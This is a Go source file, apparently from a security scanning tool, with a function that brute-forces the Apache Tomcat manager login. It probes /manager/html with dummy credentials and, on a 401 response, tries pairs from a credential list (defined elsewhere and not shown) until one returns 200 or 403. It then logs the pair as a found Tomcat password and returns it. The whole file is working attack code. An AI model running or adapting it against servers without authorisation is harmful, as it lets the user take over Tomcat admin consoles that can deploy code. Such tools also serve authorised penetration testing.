package brute

import (
	"fmt"
	"github.com/yhy0/Jie/logging"
	"github.com/yhy0/Jie/pkg/protocols/http"
)

func TomcatBrute(url string) (username string, password string) {
	if req, err := http.RequestBasic("asdasdascsacacs", "asdasdascsacacs", url+"/manager/html", "HEAD", "", false, nil); err == nil {
		if req.StatusCode == 401 {
			for uspa := range tomcatuserpass {
				if req2, err2 := http.RequestBasic(tomcatuserpass[uspa].Username, tomcatuserpass[uspa].Password, url+"/manager/html", "HEAD", "", false, nil); err2 == nil {
					if req2.StatusCode == 200 || req2.StatusCode == 403 {
						logging.Logger.Infof(fmt.Sprintf("Found vuln Tomcat password|%s:%s|%s\n", tomcatuserpass[uspa].Username, tomcatuserpass[uspa].Password, url))
						return tomcatuserpass[uspa].Username, tomcatuserpass[uspa].Password
					}
				}
			}
		}
	}
	return "", ""
}
